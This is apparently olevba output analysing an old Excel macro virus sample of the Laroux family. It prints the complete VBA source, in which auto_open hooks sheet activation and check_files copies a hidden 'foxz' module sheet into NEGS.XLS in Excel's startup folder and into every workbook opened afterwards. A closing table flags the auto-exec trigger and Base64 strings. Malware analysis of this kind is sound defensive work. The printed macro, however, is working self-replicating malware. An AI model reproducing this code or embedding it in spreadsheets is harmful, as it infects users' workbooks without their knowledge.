olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-4fee685fe0044dba9bfaf4ffa8c27601c9de2e88
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO foxz.bas 
in file: Virus.MSExcel.Laroux-based-4fee685fe0044dba9bfaf4ffa8c27601c9de2e88 - OLE stream: '_VBA_PROJECT_CUR/VBA/foxz'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



'donwload NEG!!! NoMercyExcelGenerator form NoMercyPage!
'foxz@usa.net


Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "NEGS.XLS")
    If m$ = "NEGS.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("foxz").Visible = True
    Sheets("foxz").Select
    Sheets("foxz").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = "infected by NEG Promo!"
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "NEGS.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("foxz").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "NEGS.XLS!check_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "foxz" Then Workbooks("NEGS.XLS").Sheets("foxz").Copy before:=Workbooks(n4$).Sheets(1)
        
        Workbooks(n4$).Sheets("foxz").Visible = False
    
    
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "NEGS.XLS!check_files"
    Case Else
End Select
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     11 BOUNDSHEET : Sheet Information - Visual Basic module, hidden - foxz
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet2
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet3
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet4
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet5
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet6
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet7
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet8
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet9
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet10
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet11
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet12
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet13
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet14
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet15
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet16
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

